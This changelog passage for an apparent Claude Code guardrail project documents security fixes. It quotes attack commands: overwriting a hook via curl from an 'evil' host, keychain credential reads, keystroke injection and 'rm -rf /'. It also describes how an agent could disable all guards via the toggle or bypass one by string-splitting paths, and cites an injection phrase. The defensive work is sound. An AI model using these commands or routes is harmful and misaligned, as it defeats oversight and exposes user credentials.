  Two things kept it hidden for six releases. `test-install.sh` sent the installer's output to `/dev/null`, and `error()` writes to **stdout** while `merge_hooks_into_settings` folds python3's stderr into stdout with `2>&1` — so the one message naming the cause was discarded, and stderr was empty. The installer's output is now kept and printed on failure. And the badge check compared the README against **passed** alone, so every flaky run also announced "README tests badge is stale" — an invented second bug pointing away from the real one. It now compares passed+failed: a failing test still exists.

  Suite total is unchanged at 2771, and it was never drifting. CI was green throughout, on both runners; only local parallel runs lost the race.

- [2.26.1] - 2026-07-30 — fix(security): **the agent could switch Supercharger off, and nothing asked.** `sc-toggle.sh off` writes the kill-switch, after which every hook exits 0 — so one command retires every other guard at once. Measured before writing the fix: the toggle passed `harness-tamper-guard`, `safety.sh` **and** `path-guard`, and with the flag set both `safety.sh` and `path-guard` then permitted a `settings.json` write they otherwise deny. Disable → act → re-enable worked end to end.

  That is the first step a prompt injection would want, and it partially undercut a claim in the README, which says path-guard closes *"the pattern where agents disable their own guardrails."* Direct writes to `settings.json` and `.disabled-security-categories` **are** blocked — verified — but the toggle tool was an unguarded side door to the same outcome.

  **ASK, not DENY**, because `/sc off` is a documented user control that must keep working; what changes is that it can no longer happen unseen. The confirm names the consequence ("every guard is inactive") and says plainly that an injected instruction would want exactly this step first.

  **The half that actually closes it:** an `ask` alone would be theatre, because **autopilot auto-approves everything** — precisely when nobody is watching. `lib-smart-approve` now declines to auto-approve the disable **before** the autopilot loop, the same placement and reasoning already used for critical-infra and lockfile edits. Tighten beats loosen. Verified both ways: with an active autopilot window the disable is not auto-approved, while an ordinary `ls -la` still is.

  Also fixed: `bash-injection-scanner` hardcoded `~/.claude/supercharger/scope/.debug-hooks`, so its debug flag never worked on a plugin install; it now honors `SUPERCHARGER_STATE`.

  +12 tests. One **existing** assertion changed deliberately — `test-harness-tamper-guard` asserted `sc-toggle off` passes SILENT, which is exactly the behavior being fixed; it now asserts ASK, with `/sc on` and `status` pinned as ungated so the change cannot creep. Full suite **2771/0**.

- [2.26.0] - 2026-07-30 — **feat(plugin): the plugin edition reaches feature parity with the installer — MCP servers, statusline, prompt cache, attribution, and a dependency preflight.** Four gaps closed, one deliberately left, one platform still unsupported.

  **MCP servers now ship with the plugin.** The manifest carried no `mcpServers` key and there was no `.mcp.json`, so a plugin install had *none* of Supercharger's servers — a gap nobody had noticed because the `mcp_profile` option was still prompted for and seeded, with nothing to act on. The reference confirms plugins support MCP natively, so `configs/mcp-servers.json` now ships context7, sequential-thinking, playwright and magic-ui, referenced via `"mcpServers": "./configs/mcp-servers.json"`. **Deliberately not a `.mcp.json` at the repo root:** the repo *is* the plugin root, so that filename would also load as a project-level MCP config for anyone developing Supercharger itself.

  **The three `settings.json` keys a plugin cannot declare are now written for you.** Its manifest supports only `agent` and `subagentStatusLine`, so `statusLine`, `env.ENABLE_PROMPT_CACHING_1H` and `attribution` had no declarative equivalent. A new SessionStart hook writes them on first run, gated on a `write_settings` userConfig option that **defaults to `no`** — a plugin writing outside its own space is precisely what users do not expect, so it is asked for, never assumed. `tools/plugin-setup.sh` remains the manual path and provides `--revert`.

  **Why a hook may do what the agent may not, and why the obvious shortcut was rejected.** `path-guard` and `safety.sh` deny every write to `settings.json` — that is the self-modification protection that stops an agent, or a prompt injection, from disabling its own guardrails. Those guards fire on **Claude's tool calls**; a hook is a process Claude Code runs, so its own writes are not tool calls and no guard is involved. The alternative considered was to toggle the kill-switch off, write, and toggle it back on. It works — verified — and it is exactly the bypass pattern this project exists to prevent: it would have documented the attack and opened a window in which the agent was unguarded. This path has neither property.

  **Dependency preflight.** `install.sh` refuses without `jq`/`python3`; a plugin has no install step, so nothing ever checked — while **103 of 138 hooks** shell out to `jq` and **122** to `python3`. Missing them the guards do not fail loudly, they degrade silently, which is the same "a guard that cannot run looks like a guard with nothing to do" class as the inert MCP matchers. Warns once per *distinct missing set*, so a dependency lost later is still reported, and stays silent on a healthy machine (`command -v` is a builtin — zero forks). Runs on both channels, since a classic install can lose a dependency too.

  **Refusal paths are tested harder than the happy path**, because this writes outside the plugin's space: no-op under the installer runtime · refuses when a classic install is present (an early build repointed a *working* classic statusline at the plugin shim, silently downgrading it to whatever sat in the cache) · runs once, so it cannot resurrect a key you deleted · never overwrites a statusline you chose · preserves unrelated settings · backs up first · leaves a malformed `settings.json` untouched · honors `/sc off`. The statusline shim resolves by **version, not mtime** — two cache dirs written in the same second compare equal under `-nt`, which pinned an earlier build to the *older* copy after an update.

  **Still not at parity, stated plainly:** MCP **profile filtering** does not apply (plugin servers are static; Claude Code's per-server approval selects them instead), and plugin hooks keep the portable shebang, so they are **~1.8 ms/exec slower** than a classic install. **Windows remains unsupported on both channels** — every hook is bash, `docs/WINDOWS-SUPPORT-PLAN.md` is still *proposed*, and the badge says macOS | Linux.

  +31 tests (12 seed, 10 setup, 9 preflight). 140 hook registrations. Full suite **2759/0**.

- [2.25.3] - 2026-07-30 — fix(guards): **`Object.keys(cfg)` read as a private-key file. 2.25.2 fixed one arm of this bug and left twelve.** The unbounded-token flaw was not specific to `.env` — nearly every alternative in `_SENSITIVE_NAME_RE` lacked a terminator, so each matched inside a longer identifier and any reader command (`cat`, `grep`, `head`, `sed`, `awk`) whose arguments contained one was denied as "sensitive file access". Measured against realistic samples, **13 of 13 wrongly matched**:

  | text | matched as | | text | matched as |
  |---|---|---|---|---|
  | `Object.keys(cfg)` | `Object.key` | | `cfg.certificate` | `cfg.cer` |
  | `obj.keys()` | `obj.key` | | `x.pemberton` | `x.pem` |
  | `row.keyword` | `row.key` | | `data.walletsize` | `data.wallet` |

  `.keys()` alone is ubiquitous in Python and JavaScript, so this fired constantly on ordinary source-reading.

  **Why 2.25.2 missed it, recorded because the reasoning error is the reusable part.** That release asked "does this flaw appear at the other `.env` **sites**?" — it did not, every other `.env` site already had `\b` or a lookahead, and the fix shipped looking complete. The right question was "does this flaw appear in the other **alternatives** of the same regex?" — where the answer was twelve more. Checking the sibling *instances* of a token while never checking the sibling *branches* is a narrow-scope audit dressed as a thorough one. It surfaced the way the previous ones did: the guard blocked me reading its own definition.

  Fixed with **one terminator on the whole group** rather than arm-by-arm — the arm-by-arm approach is precisely what produced a partial fix, and a group-level boundary cannot be partially applied. A non-word character still terminates, so real names survive: `cert.pem.bak` (dot), `.env-local` (hyphen), `server.key"` (quote), `id_ed25519` (end).

  +23 tests covering the whole family in both directions — every false positive above must stop, and `server.key`, `cert.pem`, `cert.pem.bak`, `client.crt`, `store.p12`, `key.pfx`, `id_ed25519`, `.npmrc`, `.netrc`, `.git-credentials`, `wallet.dat`, `main.tfvars`, `a.tokens.json`, `~/.kube/config` and `~/.docker/config.json` must all still be caught. Verified to fail against the 2.25.2 pattern (8 of them). Security suites unchanged: env-file-guard 27, aliasing 6, bash-evasions 14, secret-patterns 15, owasp-asi 31. Fuzz differential unchanged at 5,705 runs / 0 false negatives / 0 false positives. Full suite **2724/0**.

- [2.25.2] - 2026-07-30 — fix(guards): **`.env` was matched as a substring, so `os.environ` in a command read as "sensitive file access".** `safety-detect.py`'s `_SENSITIVE_NAME_RE` carried `\.env(?:\.[a-zA-Z0-9_-]+)?` with **no terminator**, so the token matched inside ordinary identifiers — `os.environ`, `process.environ`, `.environment`, `.environment_notes`. Any reader command (`cat`, `grep`, `head`, `sed`, `awk`) whose arguments happened to contain one was denied. Hit repeatedly while inspecting the guards themselves, which is how it surfaced: the guard blocked reading the file that defines it.

  **The trap in fixing it, which is the part worth recording.** The obvious terminator — `\b`, or `(?!\w)` alone — silently drops **`.envrc`**. direnv keeps secrets there, and it had only ever matched *because* the pattern was unbounded. Terminating the token without carrying `(?:rc)?` would have removed a real file from the sensitive set while every existing test stayed green: a guard that stops over-blocking by quietly under-blocking, which is worse than the false positive it fixes. The shipped pattern is `\.env(?:rc)?(?:\.[a-zA-Z0-9_-]+)?(?!\w)`, and a hyphen still terminates so `.env-local` is unaffected.

  Checked the whole family before assuming this was one instance: `safety-detect.py` has eight `.env` sites and `env-file-detect.py` five — **every other one already uses `\b` or a lookahead**, so there was no cross-channel drift to chase here, only this single unbounded token.

  +14 tests pinning both directions — the five false positives must stop, and `.env`, `.env.local`, `.env.production`, `.env-local`, `.envrc`, `~/.ssh/id_rsa` and `credentials.json` must all still be caught. Verified to fail against the pre-fix pattern (3 of 14, the reader-command cases). Fuzz differential unchanged at 5,705 runs / 0 FN / 0 FP. Full suite **2701/0**.

- [2.25.1] - 2026-07-30 — perf(install): **installed hooks get an absolute interpreter path — `#!/usr/bin/env bash` was paying a PATH search on every fire.** Measured here at **~1.8 ms per exec** (env 4.1–4.8 ms vs absolute 2.3–3.2 ms, three interleaved rounds, with bash sitting 12 entries deep in `PATH`).

  Stated precisely, because it is easy to oversell: hooks run in **parallel** waves of ~11, so this removes ~1.8 ms from a wave's *felt* latency and ~20 ms of CPU from each wave — the latter mattering under contention, not the former summing. (An earlier note in this session claimed `python3 -S` saved 11.9 ms and it was really 1–2 ms; that measurement was harness-inflated. The first pass here read 26 ms/exec for the same reason — two `python3` clock forks per iteration — so the batch method above is what the numbers come from.)

  **The saving is not the interesting part; the failure mode is.** A wrong interpreter path means a hook cannot exec at all — a guard that silently stops running, which is the exact class the 2.25.0 arc was about. Three constraints, all tested:

  1. Stamp the bash that `env` **would have found** (`command -v bash`), never a hardcoded `/bin/bash`. On a machine with Homebrew bash first on `PATH`, hardcoding would silently downgrade every hook to bash 3.2 and lose the `EPOCHREALTIME` fast path.
  2. Only stamp **stable system locations** (`/bin`, `/usr/bin`). A Homebrew/nix/asdf path can vanish on upgrade or uninstall, so those keep `env bash` — slower and still correct.
  3. **Verify by execution before keeping it.** A stamped hook is actually run; if it does not exec cleanly, every file is reverted to the portable shebang and a note is printed.

  Repo sources keep `#!/usr/bin/env bash` (portable for development and CI); only deployed copies are stamped, re-stamped on every install/update, and idempotent. Opt out with `SUPERCHARGER_STAMP_SHEBANG=0`. Verified live: 138 hooks stamped, 0 left on `env`, and the deployed guards still **deny** rather than merely execute — `rm -rf /`, the keychain read, and `curl -o` over a hook all still blocked, `ls -la` still allowed. +9 tests, including body-byte-identity, mode preservation, idempotence, and that a non-bash shebang (the Python scanners) is left alone. Full suite **2687/0**.

- [2.25.0] - 2026-07-30 — **Roll-up of the 2.24.5 → 2.24.16 arc. Update this one if you skip the rest.** Twelve patch releases in a day is not a story a version range tells, and three of them fixed guards that were **installed, tested, and not running**. If you are on any 2.24.x, this is the one to take.

  **Three security holes, all of them silent.**
  - **Every MCP hook was inert** (2.24.5). Claude Code decides matcher mode from the matcher's own characters, so the bare prefix `mcp__` asked for a tool literally *named* `mcp__` and matched nothing. Thirteen registrations sat dead — including `mcp-egress-guard` (SSRF, webhook exfil, paste-site egress inside MCP arguments), the `mcp__` arms of the injection and secret scanners, four server-specific guards, and `safety.sh`'s shell-exec MCP coverage. An unmatched matcher fires nothing and errors nothing; the only visible symptom was a missing statusline badge.
  - **Keychain reads and keystroke injection were unguarded** (2.24.13). `security find-generic-password -s github -w` returns a credential straight to stdout with no GUI confirmation, and `osascript … keystroke` types into whatever window has focus — enough to drive a password prompt or a terminal the agent is not permitted to use. Both were already *declared dangerous in the fuzzer's own corpus with no pattern implementing them*: asserted coverage that never existed, hidden inside a false-negative total nobody had triaged.
  - **Nothing stopped a hook being overwritten** (2.24.14). The tamper guard covered delete and edit-in-place but no way of *writing a new file*, so `curl -o ~/.claude/supercharger/hooks/safety.sh https://evil` replaced a security guard with attacker content and no guard in the chain objected.

  **CI had been red since 2.24.6** and was fixed in 2.24.11. The suite total is environment-dependent — two tests put their assertion *inside* a tool-availability gate, so where the tool was missing the assertion did not run, it ceased to exist. ubuntu counted 2608, macOS 2607, and the badge check compares exactly, so the matrix could never be green on both at once. macOS was never seen failing because fail-fast cancelled it.

  **Guard false positives, retired** (2.24.9, 2.24.10, 2.24.12, 2.24.14). Measured over an identical 5,705-run corpus: **false positives 50 → 0, false negatives 340 → 0.** The narrowed patterns catch 40 mutated forms the old blanket pattern missed, so precision went up *and* coverage went up. Fixed along the way: a read-only command denied because a Python loop variable `ln` matched the symlink verb; `/perf`'s own documented profiling sentinel blocked by the guard it configures; the injection scanner firing on the test suite's own attack fixtures; and an unrelated `rm` poisoning any compound command that mentioned the install directory.

  **One failure mode ran through all of it: declared but not effective.** A matcher that matched nothing. Coverage asserted in a corpus with no pattern behind it. Assertions that vanished when a tool was absent. A fuzz mutation that was a no-op. A hook catalog that advertised itself as auto-generated and never was. Each passed inspection, each failed silently, and each is now enforced structurally rather than by care:

  | Layer | What it catches | Would have caught |
  |---|---|---|
  | `test-orphan-registration` | the file never runs | fuzz-safety never collected |
  | `test-suite-count-invariance` | the assertion never runs | the six red CI releases |
  | `test-matcher-validity` | the matcher never matches | 2.24.5 — verified: 57 inert tokens on the v2.24.4 tree |
  | `list-hooks.sh --check` | the doc never regenerates | 33 lines of missing catalog |

  **No breaking changes.** One behavior change worth knowing: hand-deploying by `cp`-ing into `~/.claude/supercharger/hooks/` is now denied — use `install.sh` / `update.sh`, which are unaffected. Suite **2,678 passing** (from 2,430 at 2.24.4), green on ubuntu and macOS.

- [2.24.16] - 2026-07-30 — fix(docs): **`docs/HOOKS.md` advertises itself as auto-generated, and nothing ever checked that it had been regenerated. It hadn't.** The catalog users read to learn what is enforced was missing `harness-tamper-guard`, `bash-injection-scanner` and `test-mask-guard` — 151 lines committed against 184 generated. `tests/test-list-hooks.sh` exercised the *generator* thoroughly and never once compared its output to the committed file.

  Same silent-staleness shape the repo already guards elsewhere: `gen-plugin-hooks.sh --check` protects `hooks.json`, and `run.sh` protects the README tests badge. The hook catalog had no equivalent, so it rotted quietly while every test stayed green. `tools/list-hooks.sh --check` now mirrors that pattern (generation moved into a `generate()` function so the print and check paths cannot drift), with two tests: the committed doc must be current, and `--check` must actually fail on a deliberately stale file.

  Catalog regenerated. Also added an FAQ entry for the **2.24.14 behavior change**, which is the one thing in that release a user can trip over without reading the CHANGELOG: a script that `cp`s a file into `~/.claude/supercharger/hooks/` is now denied, because writing over an installed hook is how the guardrail layer gets torn down. `install.sh` / `update.sh` are unaffected — the guard sees `bash install.sh`, not the copies inside it — and reading or copying *out* still works. Full suite **2678/0**.

- [2.24.15] - 2026-07-30 — feat(tests): **nothing asserted that a matcher can match anything, so a registered, working, completely inert hook passed every check.** Two suites already cover neighbouring properties and both pass while a guard is dead: `test-orphan-registration` asserts a hook **is registered**, `test-hook-liveness` asserts it **responds when invoked directly**. Neither asks whether its matcher **selects any real tool** — which is precisely how v2.24.5 happened, with `mcp-egress-guard` registered, working, and never once running.

  Two rules, deliberately of different strength:

  - **Structural (version-independent).** Every token must be *capable* of matching. An `mcp__…` token containing no regex metacharacter can only match a tool literally named that, which no server exposes. This is the v2.24.5 shape, and it holds no matter which Claude Code version runs.
  - **Membership (version-sensitive).** Every plain token must be a recognised tool name, catching typos like `Bahs` or `WriteFile`. Because the tool set varies by Claude Code version and platform, tokens kept deliberately for *other* versions live in `COMPAT_TOOLS` **with a stated reason** — `MultiEdit` (older releases) and `PowerShell` (Windows only) — so a genuine typo cannot be waved through by quietly appending it.

  Scoped to `PreToolUse`/`PostToolUse`, since `Notification` matchers use their own vocabulary (`idle_prompt`, `auth_success`) and `FileChanged` matches **file paths**, not tools. The known-tool list is explicit rather than derived: the live tool set cannot be enumerated from inside a test, and inferring it would produce a check that breaks on every Claude Code release.

  **Verified against history, not just fixtures.** Run on the real `v2.24.4` tree it reports **57 inert tokens across 13 registrations**, naming each hook — `mcp-egress-guard.sh`, `mcp-tracker.sh`, `mcp-sql-guard.sh`, `safety.sh`'s MCP-shell arm and the rest. It would have caught the regression the moment it was introduced. Four self-tests keep it honest: it must flag a bare `mcp__` matcher and a typo'd tool name, and must **not** flag the corrected `mcp__.*` form or a non-tool matcher vocabulary.

  This is the third layer against one recurring failure — *declared but not effective*. `test-orphan-registration` covers "the file never runs", `test-suite-count-invariance` covers "the assertion never runs", and this covers "the matcher never matches". All three exist because each was a real outage first. Full suite **2676/0**.

- [2.24.14] - 2026-07-30 — fix(security): **`harness-tamper-guard` blocked no way of WRITING a new file over a hook — `curl -o <hook> https://evil` replaced a guard with attacker content and nothing in the chain objected.** The verb list covered delete and edit-in-place (`rm`, `mv`, `chmod`, `truncate`, `tee`, `>`), but every create-or-overwrite form was absent. Verified against the whole PreToolUse chain — `harness-tamper-guard`, `safety.sh` and `code-security-scanner` — all seven of these were allowed by **every** guard:

  ```
  cp / install / rsync / scp  <evil>  ~/.claude/supercharger/hooks/safety.sh
  curl -o …/hooks/safety.sh https://evil.tld/x       wget -O …
  perl -pi -e 's/.*//' …/hooks/safety.sh
  python3 -c "open('…/hooks/safety.sh','w').write('exit 0')"
  ```

  Found from the opposite symptom. The guard kept **denying a legitimate `cp`** into `hooks/` because an unrelated `rm` appeared elsewhere in the same command, while **allowing a malicious `cp`** on its own. Those are one flaw, not two: the guard paired *any* verb with *any* target anywhere in the command — never checking what was being written where — so it was simultaneously too loose and too tight. Both halves are fixed together.

  **Verb list** gains the write forms above. Interpreter one-liners count only when the segment also carries a write indicator (`open(…, 'w')`, `.write(`, `writeFileSync`, `truncate`), so `python3 -c "print(open(hook).read())"` stays allowed.

  **Pairing is now segment-scoped** — split on `;`, `&&`, `||`, `|` and newline; a destructive verb must actually be aimed at a protected path in the same segment. This retires the false-positive class that has recurred since 2.24.9 (an unrelated `rm` no longer poisons a whole compound command). The one thing segment-scoping would otherwise lose, the two-step `cd …/hooks` then `rm -rf .` where no single segment names the target, is handled explicitly: a `cd` INTO a protected directory arms the next destructive verb.

  **Copy-family is destination-sensitive.** For `cp`/`install`/`rsync`/`scp` only the final token counts, so copying a hook OUT for inspection is a read and passes, while copying one IN is blocked. `mv` deliberately stays position-insensitive — moving a hook out removes it from `hooks/`.

  Two bugs of mine caught by the tests before release, both worth recording because they fail SILENTLY: `awk -v` runs escape processing on the value, which rewrote `open\(` to `open(` — an unbalanced group — so awk died on the invalid regex, printed nothing, and the guard allowed **everything including `rm <hook>`**; patterns now go through `ENVIRON`, which is verbatim. And the code-dir arms required a trailing slash, so the bare `…/supercharger/hooks` in the `cd` step never matched.

  +24 tests pairing each attack with the legitimate operation it must not catch. Note for anyone deploying by hand: `cp`-ing a file into `hooks/` is now correctly denied — use `install.sh` / `update.sh`, which the guard does not see through. Full suite **2671/0**.

- [2.24.13] - 2026-07-30 — fix(security): **the fuzzer's 300 false negatives had never been triaged, and 225 of them were two real unguarded attacks.** The figure had been reported at the end of every `fuzz-safety.sh` run for releases, treated as known background noise. It was not noise: **macOS Keychain credential reads and synthetic keystroke injection were both allowed**, and both were already listed as *dangerous* in the fuzzer's own corpus with **no pattern implementing them** — coverage asserted but never built, and the uninterpretable total hid it.

  Triaging 300 entries down to distinct shapes gave **4**, each then re-tested in pristine (unmutated) form:

  | shape | pristine verdict | entries |
  |---|---|---|
  | `osascript … keystroke` | **ALLOWED** — real | 125 |
  | `security find-generic-password` | **ALLOWED** — real | 100 |
  | `ssh-keygen -t rsa` | denied | 25 (artifact) |
  | `echo "sk-…" > /tmp/x` | denied | 25 (artifact) |

  **`security find-generic-password -s github -w`** returns one credential straight to stdout and needs no GUI confirmation. `security dump-keychain` had been guarded since 2.9.14; the *targeted* read — the form actually used, because it is quieter — was not. Now blocked with its siblings: `find-internet-password`, `export` (bulk key material), and `find-certificate -p` (PEM, private keys where permitted). Category: `credentials`.

  **`osascript -e 'tell app "System Events" to keystroke …'`** types into whatever window has focus, so it can drive a GUI app, a password prompt, or a terminal the agent is not permitted to use — an authorization bypass that never passes through a guarded tool. Now blocked along with `key code` (same primitive by keycode), `System Events … click`, and `cliclick`. Anchored on the input-synthesis verbs, so ordinary automation still passes: `display notification`, app queries, `security --help`, and the word "keystroke" in a commit message or a grep. Category: `clipboard`, since it is the same "drive the user's desktop" surface. +17 tests, including per-category opt-out on both new arms and a check that an *unrelated* opt-out does not disable them.

  **Two defects in the fuzzer itself, both of which had been quietly costing coverage:**
  - `${cmd// / }` replaced a single space with a single space — a **no-op mislabelled "double space"**. The double-space evasion had therefore never been tested, and one of every base's five whitespace mutants was a duplicate of the base. Now genuinely doubles separators. (It surfaced no new gaps, so `safety.sh` was already tolerant — but that is now a measured fact rather than an assumption.)
  - `${cmd//-/  -}` spaced out **every** hyphen, including inside command names and tokens: `ssh-keygen` → `ssh  -keygen`, `sk-AAA…` → `sk -AAA…`. Those mutants are not runnable commands, so they cannot be evasions, yet they counted as false negatives — the 75 artifacts above, and the reason the FN total could not distinguish a real hole from a mangled fixture. Now only spaces hyphens that already begin a flag, which is what the mutation was for.

  **The number is now meaningful: false negatives 300 → 0, false positives 0.** Any nonzero FN from here is a real finding, which is the property the metric lacked. Also added `FUZZ_FN_LIMIT` (`=0` prints all) — the hard `head -50` is what made the total uninvestigable in the first place. Full suite **2647/0** (+17).

  Correction to this session's earlier note: the no-op mutation was described as "inflating Total runs". It did not — the mutation count per base is fixed, so `Total` was unchanged at 5,705. The cost was a wasted duplicate run and an untested evasion, not an inflated figure.

- [2.24.12] - 2026-07-30 — fix(guards)+feat(tests): **the injection scanner fired on the test suite's own attack fixtures, and nothing stopped the CI outage from recurring.** Both were open items from 2.24.11.

  **`bash-injection-scanner` flagged this repo's own green test runs.** A security suite necessarily prints its attack fixtures as result labels — `PASS scanner: blocks ignore all previous instructions` — and each one matched, so a clean suite ended with a blocking `INJECTION DETECTED` warning on stderr. Now exempt when the command is a test runner (`bash tests/…`, `./tests/…`, `npm|pnpm|yarn|bun test`, `pytest`, `tox`, `bats`, `jest`, `vitest`, `rspec`, `phpunit`, `cargo|go|dotnet|mvn|gradle test`, `make test|check`).

  The exemption rests on what running a suite already implies: to reach that output the agent **executed the project's test code**, so arbitrary code execution was granted before any warning about the text could matter. It keys on the COMMAND, not on the text — `cat tests/fixture.txt`, `echo test`, `gh pr view; echo tests/run.sh` and `curl … # npm test` all stay flagged (+16 tests pinning both halves).

  **Deliberately NOT mirrored into `prompt-injection-scanner.sh`**, which is a divergence from this repo's usual cross-channel-parity rule and is meant to stay: that hook covers Read/WebFetch/MCP, where the argument does not hold. Reading a file executes nothing, so a poisoned fixture or README pulled in through Read must still be flagged. Exempt the channel that implies execution, not the channel that doesn't.

  **New `test-suite-count-invariance.sh` closes the hole 2.24.11 left open.** 2.24.11 made the suite total platform-invariant but added nothing to keep it that way, while `release.sh` still writes the badge from whichever machine releases — so one more gated assertion would have re-broken the matrix. The rule enforced: an availability gate may skip the WORK, but it must still report the assertion, i.e. a gated block that emits assertions needs an `else`. Verified against the real regression — run on the `v2.24.10` tree it flags `test-plugin-hooks.sh:64` and `test-post-write-advisor.sh:68`, the exact two gates that caused six red releases.

  Three things the checker gets right that a naive version does not: it ignores gates that only select an expected VALUE (`test-mcp.sh`'s `HAS_GH`, which an earlier heuristic of mine false-positived on); it skips **heredoc bodies**, since test files embed shell fixtures as data (it flagged itself before this); and it does not compare assertion COUNTS, because helpers like `check` emit assertions with no literal `begin_test`. It also self-tests — four cases assert it still catches both regression shapes and still accepts both legitimate ones, so it cannot decay into decoration.

  Full suite **2630/0** (+21). Also: the `\x27`/`\x22` hex escapes in that checker are not stylistic — an unbalanced literal quote inside a `$(cat <<'PY' … )` body breaks bash 3.2's parser, which is how it first failed.

- [2.24.11] - 2026-07-30 — fix(ci): **CI had been red since 2.24.6 — the suite total is environment-dependent, and the README tests-badge check compares it exactly, so the matrix could never be green on both runners at once.** Six consecutive runs failed (2.24.6 → 2.24.10) with `FAIL: README tests badge is stale`. Last green was 2.24.5. The badge check itself is sound — it caught real drift — but it rests on an assumption that does not hold: that the suite emits the same number of assertions everywhere.

  It does not, and the cause is **installed tooling, not the OS**. Two tests put `begin_test` *inside* an availability gate, so where the tool is missing the assertion does not run — it ceases to exist:
  - `test-post-write-advisor.sh` — `broken toml` / `valid toml`, gated on `python3 -c "import tomllib"` (Python ≥ 3.11). Present on the ubuntu runner, absent on this mac. **+2 on Linux.**
  - `test-plugin-hooks.sh` — `claude plugin validate: hooks.json passes schema`, gated on the `claude` CLI. Present locally, absent on both runners. **+1 on macOS.**

  Net **+1 on Linux**: ubuntu counted 2608, macOS 2607. A single badge number cannot satisfy both, so whichever platform the releaser used, the other went red. macOS was never *seen* to fail because the matrix is fail-fast — its job was cancelled once ubuntu failed.

  Fixed at the cause rather than by loosening the check: both tests now **always emit the assertion** and report the skip (`(skipped: … not installed — … not exercised here)`) when the tool is absent. The count is now environment-invariant at **2609 on both platforms**, so exact-match enforcement is sound again. This also matches 2.24.7's thesis — a test that silently does not run is the failure mode that release built a guard for, and these two were instances of it hiding inside otherwise-correct gates.

  Diagnosed by diffing the per-assertion labels between the ubuntu log and a local run, which is what identified the three tests; the aggregate counts alone only showed a delta of 1 and would have led to patching the badge number again. Two parsing notes for anyone repeating this: macOS `sed` does not understand `\x1b`, so the usual ANSI strip silently no-ops on `gh run view` output, and that output encodes escapes in caret notation (`^[` + `[`), which needs `(?:\x1b\[|\^\[\[)[0-9;]*m`. Full suite **2609/0**.

  Not changed: `tools/release.sh` still writes the badge from the local count. That is now correct because the count is invariant — but it is only correct *while* it stays invariant. A structural guard (assert no `begin_test` sits inside an availability gate) is the durable fix and is not in this release; the heuristic needs to distinguish a gate that skips an assertion from one that merely changes an expected value, which `test-mcp.sh`'s `HAS_GH` does legitimately.

- [2.24.10] - 2026-07-30 — fix(guards): **2.24.9's `harness-tamper-guard` fix was incomplete — the false positive survived it, and only showed up when tested against the DEPLOYED copy with real literal paths.** 2.24.9 stripped scope-*file* references before the target test, which fixed `touch …/scope/.profiling` in isolation. It did not fix the actual reported case, because the install-dir arm was still `\.claude/supercharger([/[:space:]]|$)` — **any** path beneath the install dir, including the audit **logs**. Since the verb and target tests match independently, and on *different lines* of a compound command, reading an audit log in the same command as any `touch`/`rm` was still denied. It passed 2.24.9's tests only because those tests used single-purpose commands.

  Fixed at the target instead of by stripping, which also let the stripping pass be deleted rather than leaving two overlapping mechanisms: the **code** directories (`hooks/`, `lib/`, `tools/`) match per-file; the install dir and the **data** directories (`scope/`, `audit/`) match only as whole **directories**; the kill-switch keeps its own arm. So `rm -rf …/supercharger`, `rm -rf …/scope`, `rm -rf …/audit`, `rm …/tools/autopilot.sh` and overwriting `lib/utils.sh` or a hook are all still denied, while **reading** `…/audit/<log>` and **writing** `…/scope/<sentinel>` now pass.

  Verified the way 2.24.9 should have been: against the deployed hook, with fully literal `$HOME/.claude/supercharger/...` paths in one compound command — audit read (69 lines), sentinel create, sentinel remove, all three now succeed. +5 tests, including the exact multi-line shape that survived 2.24.9. Full suite **2607/0**.

  **Method note:** the earlier verification used a string-concatenation trick (`"$HOME/.claude/superch""arger"`) to route around the guard while working. That habit hid the bug — the concatenated path never matched the target pattern, so the false positive looked fixed. A guard fix has to be exercised with the literal input a user would type.

- [2.24.9] - 2026-07-30 — fix(guards): **three guards were blocking legitimate work, two of them read-only commands — and narrowing one of them exposed a detection gap the old pattern had.** All three were hit while verifying the v2.24.5 MCP fix: the guards blocked the very steps needed to read the audit log and enable the documented profiling sentinel.

  **`harness-tamper-guard`, false positive 1 — a Python loop variable.** `ln` sat in the verb alternation as a bare two-letter token, so `for ln in open(f):` inside an inlined script read as the symlink command. The verb and target tests are *independent* — either may match on any line — so a purely **read-only** command that merely mentioned the install dir was denied. `ln` now requires a following `-flag` or a `/`-bearing path. Same class as the `cat scope/.disabled-hooks` false positive already fixed in safety.sh's selfmod.

  **`harness-tamper-guard`, false positive 2 — the guard blocked its own documented control.** `/perf` tells users to `touch …/scope/.profiling`, and autopilot/readonly/strict/profile write flags to that directory constantly; all of it sits under the install dir, which the target pattern matched. Scope **file** references are now stripped before the target test. Deliberately still blocked: creating `.supercharger-disabled` (re-tested against the original command, since the kill-switch also lives in scope/) and `rm -rf …/scope` as a directory. `.disabled-hooks` / `.disabled-security-categories` stay covered by safety.sh's `selfmod`, which is independent of this guard.

  **`safety.sh` — piping data into a named local script read as `curl|bash`.** The pattern was a blanket "any pipe into a shell", so `printf '{}' | bash ./hooks/statusline.sh` was denied — there the piped bytes are the script's stdin *data* and the code is a file on disk, so the pipe grants nothing. Narrowed to the three forms where **the piped bytes are the code**: no script operand (`| bash`, `| sh -s`), an explicit `-c`, or an explicit stdin operand (`-`, `/dev/stdin`, `/dev/fd/N`). curl/wget keep their own dedicated patterns, so download-and-execute stays covered twice.

  **The narrowing first shipped with a hole, and the fuzzer caught it.** `… | bash -; echo done` and `… | bash /dev/stdin; echo done` were **allowed**: the tail class was `([[:space:]]|$)` and a `;` is neither, so a trailing command separator bought an escape the blanket pattern had caught. Found only because `fuzz-safety.sh` had **no pipe-to-shell payloads at all** — its single `| bash` was the harness's own invocation line — so a before/after differential over this pattern was vacuous by construction. 8 dangerous bases (`curl|bash`, `cat f|bash`, `-s`, `-`, `/dev/stdin`, `-c`, `|zsh`) and the 2 benign ones were added first; they immediately exposed the gap. Fixed by accepting separators in the tail class.

  **Result — better on both axes, measured over the same 5,705-run corpus.** False positives **50 → 0**; false negatives **340 → 300**. The narrowed patterns catch 40 mutated forms the old blanket pattern *missed*, and 300 is exactly the pre-existing baseline, so every mutation of the 8 dangerous bases is now blocked. +27 tests, each pairing the false positive with the attack it must still catch, and verified to fail against the pre-fix guards (6 of 27) before being accepted. Full suite **2602/0**.

- [2.24.8] - 2026-07-29 — perf(tests): **suite runs 5.4× faster and no longer writes to your real config.** Wall time 420s → **78s** (2575/0, identical to serial), and a full run now leaves `~/.claude/supercharger` untouched — measured, `.blocked-commands` 558 lines before and 558 after.

